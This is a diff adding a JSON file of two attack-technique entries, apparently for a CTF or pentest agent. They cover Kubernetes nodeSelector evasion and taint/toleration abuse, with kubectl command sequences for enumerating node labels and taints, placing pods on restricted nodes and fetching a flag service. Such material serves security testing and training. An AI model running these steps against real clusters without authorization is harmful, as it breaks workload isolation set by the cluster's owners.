@@ -1,0 +1,89 @@
+[
+  {
+    "id": "k8s-node-selector-evasion",
+    "category": "EXPLOIT",
+    "subcategory": "K8s_Networking",
+    "title": "K8s Node Selector Evasion — Scheduling Bypass via Label Matching (K8S-28)",
+    "description": "Kubernetes nodes can be configured with labels to restrict pod placement via nodeSelector in pod specs. If an attacker has pod creation permissions, they can schedule workloads on restricted nodes by discovering and matching the nodeSelector labels. Attack: (1) Discover node labels: kubectl get nodes --show-labels — look for labels like security=restricted or other custom labels that indicate restricted nodes. (2) Note the restricted label key-value pair (e.g., security=restricted) from node output. (3) Create a pod with matching nodeSelector: kubectl run evader --image=alpine:latest --overrides='{\"spec\":{\"nodeSelector\":{\"security\":\"restricted\"}}}' -- sleep 3600. (4) Wait for pod: kubectl wait --for=condition=Ready pod/evader --timeout=30s. (5) If a flag service runs on the restricted node, discover the service ClusterIP: kubectl get svc flag-svc -o jsonpath='{.spec.clusterIP}'. (6) Access the flag from the bypass pod: kubectl exec evader -- wget -qO- http://FLAG_IP:8080. Key insight: nodeSelector is a label match — if the attacker knows or can enumerate the label, they can bypass scheduling restrictions entirely. This technique does not require any special capabilities; only pod creation permission in the cluster.",
+    "techniques": [
+      "kubectl get nodes --show-labels",
+      "kubectl describe node NODE | grep Labels",
+      "kubectl run evader --image=alpine:latest --overrides='{\"spec\":{\"nodeSelector\":{\"security\":\"restricted\"}}}' -- sleep 3600",
+      "kubectl wait --for=condition=Ready pod/evader --timeout=30s",
+      "kubectl get svc flag-svc -n NAMESPACE -o jsonpath='{.spec.clusterIP}'",
+      "kubectl exec evader -- wget -qO- http://CLUSTER_IP:8080"
+    ],
+    "indicators": [
+      "Nodes with custom labels like security=restricted or env=isolated",
+      "Flag service running on restricted nodes",
+      "User has pod creation permissions",
+      "nodeSelector in pod spec visible via describe"
+    ],
+    "prerequisites": [
+      "kubectl access to cluster with get nodes permission",
+      "Pod creation permissions in target namespace",
+      "Knowledge of the restricted node's label key-value pair"
+    ],
+    "tools": [
+      "kubectl_get_pods",
+      "kubectl_exec",
+      "kubectl_run"
+    ],
+    "tags": [
+      "k8s",
+      "node-selector",
+      "scheduling",
+      "bypass",
+      "label",
+      "node-evasion",
+      "k8s-28",
+      "privilege-escalation"
+    ],
+    "confidence": 0.85,
+    "mitre_attack": "T1610"
+  },
+  {
+    "id": "k8s-toleration-abuse",
+    "category": "EXPLOIT",
+    "subcategory": "K8s_Networking",
+    "title": "K8s Toleration Abuse — Taint Bypass via Toleration Injection (K8S-29)",
+    "description": "Kubernetes nodes use taints to repel pods unless those pods have matching tolerations. If an attacker can create pods, they can bypass taint-based isolation by setting the correct tolerations in the pod spec, scheduling workloads on otherwise restricted nodes. Attack: (1) Discover tainted nodes: kubectl describe nodes | grep -A1 Taint — look for entries like protected=true:NoSchedule. (2) Note the taint key, value, and effect (e.g., key=protected, value=true, effect=NoSchedule). (3) Create a pod with matching toleration: kubectl run tolerator --image=alpine:latest --overrides='{\"spec\":{\"tolerations\":[{\"key\":\"protected\",\"operator\":\"Equal\",\"value\":\"true\",\"effect\":\"NoSchedule\"}]}}' -- sleep 3600. (4) Wait for pod to schedule on the tainted node: kubectl wait --for=condition=Ready pod/tolerator --timeout=30s. (5) Access flags or services on the protected node: discover service ClusterIP and exec into tolerator pod to access it. Key variants: (a) If operator is Exists (no value required), use {\"operator\":\"Exists\",\"key\":\"protected\",\"effect\":\"NoSchedule\"}. (b) For NoExecute taints (which evict existing pods), the tolerator pod must be created AFTER the taint is applied or use tolerationSeconds: 0. (c) For PreferNoSchedule, standard toleration works but scheduling is not guaranteed. (d) Wildcard toleration: {\"operator\":\"Exists\"} tolerates ALL taints — use with caution as it may schedule the pod on undesirable nodes.",
+    "techniques": [
+      "kubectl describe nodes | grep -A1 Taint",
+      "kubectl get nodes -o json | python3 -c \"import sys,json; [print(n['metadata']['name'],[t for t in n['spec'].get('taints',[])]) for n in json.load(sys.stdin)['items']]\"",
+      "kubectl run tolerator --image=alpine:latest --overrides='{\"spec\":{\"tolerations\":[{\"key\":\"protected\",\"operator\":\"Equal\",\"value\":\"true\",\"effect\":\"NoSchedule\"}]}}' -- sleep 3600",
+      "Wildcard toleration: {\"spec\":{\"tolerations\":[{\"operator\":\"Exists\"}]}}",
+      "kubectl wait --for=condition=Ready pod/tolerator --timeout=30s",
+      "kubectl exec tolerator -- wget -qO- http://FLAG_SERVICE:8080"
+    ],
+    "indicators": [
+      "Nodes with taints (NoSchedule, NoExecute, PreferNoSchedule)",
+      "Restricted or vault namespaces on tainted nodes",
+      "User has pod creation permissions",
+      "Service endpoints only accessible from tainted nodes"
+    ],
+    "prerequisites": [
+      "kubectl access with node describe permissions",
+      "Pod creation permissions",
+      "Knowledge of taint key, value, and effect"
+    ],
+    "tools": [
+      "kubectl_get_pods",
+      "kubectl_exec",
+      "kubectl_run"
+    ],
+    "tags": [
+      "k8s",
+      "toleration",
+      "taint",
+      "bypass",
+      "scheduling",
+      "node-evasion",
+      "k8s-29",
+      "no-schedule",
+      "privilege-escalation"
+    ],
+    "confidence": 0.85,
+    "mitre_attack": "T1610"
+  }
+]
